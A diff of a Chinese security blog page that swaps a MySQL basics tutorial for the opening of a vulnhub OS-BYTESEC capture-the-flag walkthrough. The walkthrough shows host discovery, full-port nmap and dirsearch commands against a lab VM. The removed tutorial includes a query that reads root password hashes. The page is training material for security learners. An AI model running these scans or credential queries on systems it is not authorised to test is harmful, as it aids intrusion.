@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="WEB安全MySQL基础, Cx330 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="vulnhub靶场OS-BYTESEC, Cx330 计算机 网络安全 渗透测试">
     <meta name="description" content="专科 | 电子信息工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>WEB安全MySQL基础 | Cx330</title>
+    <title>vulnhub靶场OS-BYTESEC | Cx330</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -355,12 +355,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2022/08/13/vtucbq.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdnjson.com/images/2022/11/14/bg.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">WEB安全MySQL基础</h1>
+                    <h1 class="description center-align post-title">vulnhub靶场OS-BYTESEC</h1>
                 </div>
             </div>
         </div>
@@ -483,8 +483,8 @@
                                 <span class="chip bg-color">Web Security</span>
                             </a>
                         
-                            <a href="/tags/MySQL/">
-                                <span class="chip bg-color">MySQL</span>
+                            <a href="/tags/vulnhub/">
+                                <span class="chip bg-color">vulnhub</span>
                             </a>
                         
                     </div>
@@ -495,8 +495,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-category">
-                                数据库
+                            <a href="/categories/vulnhub/" class="post-category">
+                                vulnhub
                             </a>
                         
                     </div>
@@ -508,28 +508,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-08-08
+                    2022-11-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-08-16
+                    2022-11-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.9k
+                    446
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    16 分
+                    1 分
                 </div>
                 
 
@@ -549,434 +549,60 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x001-MySQL-简介"><a href="#0x001-MySQL-简介" class="headerlink" title="0x001 MySQL 简介"></a>0x001 MySQL 简介</h3><hr>
-<p><strong>什么是数据库？</strong><br>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。</p>
-<p>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</p>
-<p>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p>
-<p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p>
-<p>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：</p>
-<ul>
-<li>数据以表格的形式出现</li>
-<li>每行为各种记录名称</li>
-<li>每列为记录名称所对应的数据域</li>
-<li>许多的行和列组成一张表单</li>
-<li>若干的表单组成database</li>
-</ul>
+                <h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr>
+<p>难度：中级<br>flag：2个flag第一个用户和第二个root<br>学习：利用|中小企业|枚举|速记|权限提升<br>联系：<a target="_blank" rel="noopener" href="https://www.linkedin.com/in/rahulgehlaut/">https://www.linkedin.com/in/rahulgehlaut/</a></p>
 <hr>
-<h3 id="0x002-MySQL-安装"><a href="#0x002-MySQL-安装" class="headerlink" title="0x002 MySQL 安装"></a>0x002 MySQL 安装</h3><p>所有平台的 MySQL 下载地址为： <a target="_blank" rel="noopener" href="https://dev.mysql.com/downloads/mysql/">MySQL 下载</a> 。 挑选你需要的 MySQL Community Server 版本及对应的平台。</p>
-<blockquote>
-<p>注意：安装过程我们需要通过开启管理员权限来安装，否则会由于权限不足导致无法安装。</p>
-</blockquote>
-<p>Linux/UNIX 上安装 MySQL<br>Linux平台上推荐使用RPM包来安装Mysql,MySQL AB提供了以下RPM包的下载地址：</p>
-<ul>
-<li>MySQL - MySQL服务器。你需要该选项，除非你只想连接运行在另一台机器上的MySQL服务器。</li>
-<li>MySQL-client - MySQL 客户端程序，用于连接并操作Mysql服务器。</li>
-<li>MySQL-devel - 库和包含文件，如果你想要编译其它MySQL客户端，例如Perl模块，则需要安装该RPM包。</li>
-<li>MySQL-shared - 该软件包包含某些语言和应用程序需要动态装载的共享库(libmysqlclient.so*)，使用MySQL。</li>
-<li>MySQL-bench - MySQL数据库服务器的基准和性能测试工具。</li>
-</ul>
-<p>安装前，我们可以检测系统是否自带安装 MySQL:</p>
-<pre class=" language-bash"><code class="language-bash">rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> mysql
-</code></pre>
-<p>如果你系统有安装，那可以选择进行卸载:</p>
-<pre class=" language-bash"><code class="language-bash">rpm -e mysql　　// 普通删除模式
-rpm -e --nodeps mysql　　// 强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除
-</code></pre>
-<p><strong>安装 MySQL：</strong></p>
-<p>接下来我们在 <code>Centos7</code> 系统下使用 <code>yum</code> 命令安装 <code>MySQL</code>，需要注意的是 <code>CentOS 7</code> 版本中 <code>MySQL</code>数据库已从默认的程序列表中移除，所以在安装前我们需要先去官网下载 <code>Yum</code> 资源包，下载地址为：<a target="_blank" rel="noopener" href="https://dev.mysql.com/downloads/repo/yum/">https://dev.mysql.com/downloads/repo/yum/</a></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm
-rpm -ivh mysql-community-release-el7-5.noarch.rpm
-yum update
-yum <span class="token function">install</span> mysql-server
-</code></pre>
-<p>权限设置：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">chown</span> -R mysql:mysql /var/lib/mysql/
-</code></pre>
-<p>初始化 <code>MySQL</code>：</p>
-<pre class=" language-bash"><code class="language-bash">mysqld --initialize
-</code></pre>
-<p>启动 <code>MySQL</code>：</p>
-<pre class=" language-bash"><code class="language-bash">systemctl start mysqld
-</code></pre>
-<p>查看 <code>MySQL</code> 运行状态：</p>
-<pre class=" language-bash"><code class="language-bash">systemctl status mysqld
-</code></pre>
-<blockquote>
-<p>注意：如果我们是第一次启动 mysql 服务，mysql 服务器首先会进行初始化的配置。</p>
-</blockquote>
-<p>此外,你也可以使用 <code>MariaDB</code> 代替，<code>MariaDB</code> 数据库管理系统是 <code>MySQL</code> 的一个分支，主要由开源社区在维护，采用 <code>GPL</code> 授权许可。开发这个分支的原因之一是：甲骨文公司收购了 <code>MySQL</code> 后，有将 <code>MySQL</code> 闭源的潜在风险，因此社区采用分支的方式来避开这个风险。</p>
-<p><code>MariaDB</code>的目的是完全兼容<code>MySQL</code>，包括<code>API</code>和命令行，使之能轻松成为<code>MySQL</code>的代替品。</p>
-<pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> mariadb-server mariadb
-</code></pre>
-<p><code>mariadb</code>数据库的相关命令是：</p>
-<pre class=" language-bash"><code class="language-bash">systemctl start mariadb  <span class="token comment" spellcheck="true">#启动MariaDB</span>
-systemctl stop mariadb  <span class="token comment" spellcheck="true">#停止MariaDB</span>
-systemctl restart mariadb  <span class="token comment" spellcheck="true">#重启MariaDB</span>
-systemctl <span class="token function">enable</span> mariadb  <span class="token comment" spellcheck="true">#设置开机启动</span>
-</code></pre>
-<p><strong>验证 MySQL 安装</strong></p>
-<p>在成功安装 <code>MySQL</code> 后，一些基础表会表初始化，在服务器启动后，你可以通过简单的测试来验证 <code>MySQL</code> 是否工作正常。</p>
-<p>使用 <code>mysqladmin</code> 工具来获取服务器状态：</p>
-<p>使用 <code>mysqladmin</code> 命令来检查服务器的版本, 在 <code>linux</code> 上该二进制文件位于 <code>/usr/bin</code> 目录，在 <code>Windows</code> 上该二进制文件位于 <code>C:\mysql\bin</code> 。</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysqladmin --version</span>
-</code></pre>
-<p><code>linux</code>上该命令将输出以下结果，该结果基于你的系统信息：</p>
-<pre class=" language-bash"><code class="language-bash">mysqladmin  Ver 8.23 Distrib 5.0.9-0, <span class="token keyword">for</span> redhat-linux-gnu on i386
-</code></pre>
-<p>如果以上命令执行后未输出任何信息，说明你的<code>Mysql</code>未安装成功。</p>
-<p>使用 <code>MySQL Client(Mysql客户端)</code> 执行简单的<code>SQL</code>命令</p>
-<p>你可以在 <code>MySQL Client(Mysql客户端)</code> 使用 <code>mysql</code> 命令连接到 <code>MySQL</code> 服务器上，默认情况下 <code>MySQL</code> 服务器的登录密码为空，所以本实例不需要输入密码。</p>
-<p>命令如下：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysql</span>
-</code></pre>
-<p>以上命令执行后会输出 <code>mysql&gt;</code>提示符，这说明你已经成功连接到<code>Mysql</code>服务器上，你可以在 <code>mysql&gt;</code> 提示符执行<code>SQL</code>命令：</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW DATABASES<span class="token punctuation">;</span>
-+----------+
-<span class="token operator">|</span> Database <span class="token operator">|</span>
-+----------+
-<span class="token operator">|</span> mysql    <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token function">test</span>     <span class="token operator">|</span>
-+----------+
-2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.13 sec<span class="token punctuation">)</span>
-</code></pre>
-<p><strong><code>Mysql</code>安装后需要做的</strong></p>
-<p><code>Mysql</code>安装成功后，默认的<code>root</code>用户密码为空，你可以使用以下命令来创建<code>root</code>用户的密码：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysqladmin -u root password "new_password";</span>
-</code></pre>
-<p>现在你可以通过以下命令来连接到<code>Mysql</code>服务器：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysql -u root -p</span>
-Enter password:*******
-</code></pre>
-<blockquote>
-<p>注意：在输入密码时，密码是不会显示了，你正确输入即可。</p>
-</blockquote>
-<p><strong>Windows 上安装 MySQL</strong></p>
-<p><code>Windows</code> 上安装 <code>MySQL</code> 相对来说会较为简单，最新版本可以在 <code>MySQL</code> 下载 中下载中查看(更详细安装：<code>Windows</code> 上安装 <code>MySQL</code>)。</p>
-<p>点击 <code>Download</code> 按钮进入下载页面，点击下图中的 <code>No thanks, just start my download.</code> 就可立即下载：</p>
-<p>下载完后，我们将 <code>zip</code> 包解压到相应的目录，这里我将解压后的文件夹放在 <code>C:\web\mysql-8.0.11</code> 下。</p>
-<p>接下来我们需要配置下  <code>MySQL</code> 的配置文件</p>
-<p>打开刚刚解压的文件夹 <code>C:\web\mysql-8.0.11</code> ，在该文件夹下创建 <code>my.ini</code> 配置文件，编辑 <code>my.ini</code> 配置以下基本信息：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>client<span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true"># 设置mysql客户端默认字符集</span>
-default-character-set<span class="token operator">=</span>utf8
- 
-<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true"># 设置3306端口</span>
-port <span class="token operator">=</span> 3306
-<span class="token comment" spellcheck="true"># 设置mysql的安装目录</span>
-basedir<span class="token operator">=</span>C:\\web\\mysql-8.0.11
-<span class="token comment" spellcheck="true"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span>
-<span class="token comment" spellcheck="true"># datadir=C:\\web\\sqldata</span>
-<span class="token comment" spellcheck="true"># 允许最大连接数</span>
-max_connections<span class="token operator">=</span>20
-<span class="token comment" spellcheck="true"># 服务端使用的字符集默认为8比特编码的latin1字符集</span>
-character-set-server<span class="token operator">=</span>utf8
-<span class="token comment" spellcheck="true"># 创建新表时将使用的默认存储引擎</span>
-default-storage-engine<span class="token operator">=</span>INNODB
-</code></pre>
-<p><strong>启动 <code>MySQL</code> 数据库：</strong></p>
-<p>以管理员身份打开 <code>cmd</code> 命令行工具，切换目录：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> C:\web\mysql-8.0.11\bin
-</code></pre>
-<p>初始化数据库：</p>
-<pre class=" language-bash"><code class="language-bash">mysqld --initialize --console
-</code></pre>
-<p>执行完成后，会输出 root 用户的初始默认密码，如：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>.
-2018-04-20T02:35:05.464644Z 5 <span class="token punctuation">[</span>Note<span class="token punctuation">]</span> <span class="token punctuation">[</span>MY-010454<span class="token punctuation">]</span> <span class="token punctuation">[</span>Server<span class="token punctuation">]</span> A temporary password is generated <span class="token keyword">for</span> root@localhost: APWCY5ws<span class="token operator">&amp;</span>hjQ
-<span class="token punctuation">..</span>.
-</code></pre>
-<p><code>APWCY5ws&amp;hjQ</code> 就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。</p>
-<p>输入以下安装命令：</p>
-<pre class=" language-bash"><code class="language-bash">mysqld <span class="token function">install</span>
-</code></pre>
-<p>启动输入以下命令即可：</p>
-<pre class=" language-bash"><code class="language-bash">net start mysql
-</code></pre>
-<blockquote>
-<p>注意: 在 5.7 需要初始化 data 目录：</p>
-</blockquote>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> C:\web\mysql-8.0.11\bin 
-mysqld --initialize-insecure
-</code></pre>
-<p>初始化后再运行 <code>net start mysql</code> 即可启动 <code>mysql</code>。</p>
-<p><strong>登录 MySQL</strong></p>
-<p>当 <code>MySQL</code> 服务已经运行时, 我们可以通过 <code>MySQL</code> 自带的客户端工具登录到 <code>MySQL</code> 数据库中, 首先打开命令提示符, 输入以下格式的命名:</p>
-<pre class=" language-bash"><code class="language-bash">mysql -h 主机名 -u 用户名 -p
-</code></pre>
-<p>参数说明：</p>
-<ul>
-<li>-h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;</li>
-<li>-u : 登录的用户名;</li>
-<li>-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。</li>
-</ul>
-<p>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：</p>
-<pre class=" language-bash"><code class="language-bash">mysql -u root -p
-</code></pre>
-<p>按回车确认, 如果安装正确且 <code>MySQL</code> 正在运行, 会得到以下响应:</p>
-<pre class=" language-bash"><code class="language-bash">Enter password:
-</code></pre>
-<p>若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 <code>Welcome to the MySQL monitor...</code> 的提示语。</p>
-<p>然后命令提示符会一直以 <code>mysql&gt;</code> 加一个闪烁的光标等待命令的输入, 输入 <code>exit</code> 或 <code>quit</code> 退出登录。</p>
+<h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">https://www.vulnhub.com/entry/hacknos-os-bytesec,393/</a></p>
 <hr>
-<h3 id="0x003-MySQL-的基本认识"><a href="#0x003-MySQL-的基本认识" class="headerlink" title="0x003 MySQL 的基本认识"></a>0x003 MySQL 的基本认识</h3><p><strong>MYSQL 数据库的一些解释</strong></p>
-<blockquote>
-<p>注意：<br>数据库就相当于文件夹<br>表就相当于文件</p>
-</blockquote>
-<p><strong>mysql 注释符有三种</strong></p>
-<ol>
-<li>#…</li>
-<li>“– …”</li>
-<li>/<em>…</em>/</li>
-</ol>
+<h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr>
+<h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/1b9b9b63bd18d1269.png" alt="探测存活主机"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/2.png" alt="端口扫描"></p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/3.png" alt="目录扫描"></p>
+<p>访问扫描到的目录，发现基本都是图片，没有什么可以利用的信息</p>
 <hr>
-<h3 id="0x004-MySQL-的基本操作"><a href="#0x004-MySQL-的基本操作" class="headerlink" title="0x004 MySQL 的基本操作"></a>0x004 MySQL 的基本操作</h3><h4 id="1-库的增删改查-sql-语句"><a href="#1-库的增删改查-sql-语句" class="headerlink" title="1. 库的增删改查(sql 语句)"></a>1. 库的增删改查(sql 语句)</h4><ul>
-<li>增：create database db1;</li>
-<li>删：drop database db1;</li>
-<li>改：alter database db1 charset utf8;</li>
-<li>查：show databases;#查看所有的数据库</li>
-</ul>
-<p>查看指定的数据库</p>
-<pre class=" language-bash"><code class="language-bash">show create database db1<span class="token punctuation">;</span>
-</code></pre>
-<p>设置默认的 <code>utf8</code>,在配置文件中：写上 <code>character_set_server = utf8</code></p>
-<p>查看你当前在哪个库</p>
-<pre class=" language-bash"><code class="language-bash">use db2
-<span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>重命名数据库 </p>
-<pre class=" language-bash"><code class="language-bash">RENAME database olddbname TO newdbname
-</code></pre>
-<pre class=" language-bash"><code class="language-bash">show status<span class="token punctuation">;</span> -- 显示一些系统特定资源的信息，例如，正在运行的线程数量。
-desc tabl_name<span class="token punctuation">;</span> 显示表结构，字段类型，主键，是否为空等属性，但不显示外键。
-show databases 查看这个 mysql 里面有多少个库
-use mysql 
-use 选择数据库
-show tables 查看当前库里面所有的表
-</code></pre>
-<p>查看当前数据库 里面的表 user 用户为 root 的密码</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> password from user where user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>
-Mysql 5.7 <span class="token keyword">select</span> authentication_string,user from mysql.user<span class="token punctuation">;</span>
-</code></pre>
-<p>修改 <code>MySQL</code> 数据库字符集为 <code>UTF-8</code></p>
-<pre class=" language-bash"><code class="language-bash">alter database 数据库名 character <span class="token keyword">set</span> utf8<span class="token punctuation">;</span>
-</code></pre>
-<h4 id="2-table-表的操作"><a href="#2-table-表的操作" class="headerlink" title="2. table 表的操作"></a>2. table 表的操作</h4><p><strong>查看表结构</strong></p>
-<pre class=" language-bash"><code class="language-bash">desc table
-DESCRIBE 表名
-</code></pre>
-<p>查看表的所有内容</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">select</span> * from table_name
-</code></pre>
-<p>建表</p>
-<pre class=" language-bash"><code class="language-bash">CREATE TABLE 表名 <span class="token punctuation">(</span>
-    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>,
-    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>,
-    <span class="token punctuation">..</span>.
-    <span class="token punctuation">..</span>.
-    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>
-    <span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>字段名就是属性名</p>
-<p>完整的建立表的语句</p>
-<pre class=" language-bash"><code class="language-bash">create table users<span class="token punctuation">(</span>id int<span class="token punctuation">(</span>7<span class="token punctuation">)</span> AUTO_INCREMENT,
-                username varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span> not null,
-                password varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span> not null,
-                PRIMARY KEY<span class="token punctuation">(</span>id<span class="token punctuation">)</span>
-                <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>
-                
-mysql<span class="token operator">></span> create table users<span class="token punctuation">(</span>id int<span class="token punctuation">(</span>7<span class="token punctuation">)</span> UNSIGNED auto_increment,username varchar<span class="token punctuation">(</span>30<span class="token punctuation">)</span> not null,password varchar<span class="token punctuation">(</span>32<span class="token punctuation">)</span> not null,email varchar<span class="token punctuation">(</span>40<span class="token punctuation">)</span>,primary key <span class="token punctuation">(</span>id<span class="token punctuation">))</span>engine<span class="token operator">=</span>myisam default charset<span class="token operator">=</span>utf8<span class="token punctuation">;</span>
-Query OK, 0 rows affected <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
-</code></pre>
-<p><code>if not exists</code> 表示当相同的表名存在时，则不执行此创建语句，避免语句执行错误</p>
-<pre class=" language-bash"><code class="language-bash">create database <span class="token keyword">if</span> not exists <span class="token punctuation">[</span>table<span class="token punctuation">]</span><span class="token punctuation">;</span>
-</code></pre>
-<p><code>ENGINE</code> 设置表的引擎和默认的字符类型</p>
-<pre class=" language-bash"><code class="language-bash">ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>
-</code></pre>
-<p>常见的数据库引擎</p>
-<p>InnoDB myisam</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-xlp/p/8617760.html">数据类型</a></p>
-<p><strong>约束条件</strong></p>
-<ul>
-<li>PRIMARY KEY 标识该属性为该表的主键，可以唯一的标识对应的元组</li>
-<li>FOREIGN KEY 标识该属性为该表的外键，是与之联系某表的主键</li>
-<li>NOT NULL 标识该属性不能为空</li>
-<li>UNIQUE 标识该属性的值是唯一的</li>
-<li>AUTO_INCREMENT 标识该属性的值是自动增加，这是 MySQL 的 SQL 语句特色</li>
-<li>DEFAULT 为该属性设置默认值</li>
-</ul>
-<p><strong>修改表的操作</strong></p>
-<p>修改表</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 旧表名 RENAME 新表名<span class="token punctuation">;</span>
-</code></pre>
-<p>修改字段的数据类型</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 MODIFY 属性名 数据类型<span class="token punctuation">;</span>
-</code></pre>
-<p>修改字段名：</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 CHANGE 旧属性名 新属性名 新数据类型<span class="token punctuation">;</span>
-</code></pre>
-<p>增加字段名</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 ADD 属性名 1 数据类型 <span class="token punctuation">[</span>完整性约束条件<span class="token punctuation">]</span> <span class="token punctuation">[</span>FIRST <span class="token operator">|</span> AFTER 属性名 2<span class="token punctuation">]</span><span class="token punctuation">;</span>
-</code></pre>
-<p>删除字段</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 DROP 属性名<span class="token punctuation">;</span>
-</code></pre>
-<p>更改表的存储引擎</p>
-<pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 ENGINE <span class="token operator">=</span> 存储引擎名<span class="token punctuation">;</span>
-</code></pre>
-<hr>
-<h3 id="0x005-数据的增删改查"><a href="#0x005-数据的增删改查" class="headerlink" title="0x005 数据的增删改查"></a>0x005 数据的增删改查</h3><p>为表中所有字段添加数据</p>
-<p>语法：INSERT INTO 表名(字段名 1，字段名 2，…) VALUES(值 1，值 2，…);</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span>1,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-或者
-mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>1,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>
-</code></pre>
-<p><strong>增</strong></p>
-<p>语法：INSERT INTO 表名 VALUES(值 11，值 2，…);</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>null,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>语法：INSERT INTO 表名（字段 1，字段 2，…) VALUES(值 1，值 2，…);<br>语法：INSERT INTO 表名 SET 字段名 1=值 1[,字段名 2=值 2，…]</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> INSERT INTO student SET id<span class="token operator">=</span>4,name<span class="token operator">=</span><span class="token string">'zhaoliu'</span>,grade<span class="token operator">=</span>72;
-</code></pre>
-<p>同时添加多条数据<br>语法：INSERT INTO 表名[(字段名 1，字段名 2，…)] VALUES (值 1，值 2，…),<br>(值 1，值 2，…);</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> <span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span>values<span class="token punctuation">(</span>null,<span class="token string">'moon'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>null,<span class="token string">'alex'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>语法：INSERT INTO 表名[(字段名 1，字段名 2，…)] VALUES(值 1，值 2，…),<br>(值 1，值 2，…),(值 1，值 2，…);</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>null,<span class="token string">'moon1'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>null,<span class="token string">'alex1'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p><strong>删</strong></p>
-<p>语法：DELETE FROM 表名 [WHERE 条件表达式]</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> delete from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>
-</code></pre>
-<p>删除全部数据</p>
-<p>若 DELETE 语句中没有使用 WHERE 语句，则会将表中所有记录都删除。</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> DELETE FROM 表名
-</code></pre>
-<p>删除全部数据的另一种方法——TRUNCATE</p>
-<p><strong>更新</strong></p>
-<p>语法：UPDATE 表名 SET 字段名 1=值 1，[ 字段名 2=值 2，…][ WHERE 条件表达式 ]</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'aaaa'</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>
-mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'123456'</span>,username<span class="token operator">=</span><span class="token string">'moon'</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>
-mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span>456789<span class="token punctuation">;</span>
-</code></pre>
-<p><strong>查</strong></p>
-<p>查询 <code>users</code> 表的所有字段（星号代表所有的字段）</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>
-</code></pre>
-<p>查询指定的字段</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span><span class="token punctuation">;</span>
-</code></pre>
-<p>按条件调节查询<br>语法：SELECT 字段名 1，字段名 2，…FROM 表名 WHERE 条件表达式</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>
-</code></pre>
-<p><code>in</code> 查询</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM student2 WHERE <span class="token function">id</span> IN <span class="token punctuation">(</span>1,2,3<span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>带 <code>BETWEEN AND</code> 关键字的查询</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token function">id</span> not between 1 and 10<span class="token punctuation">;</span>
-</code></pre>
-<p>带 <code>DISTINCT</code> 关键字的查询</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> distinct username from <span class="token function">users</span><span class="token punctuation">;</span>
-</code></pre>
-<p><code>like</code> 查询 一般都会给跟着%</p>
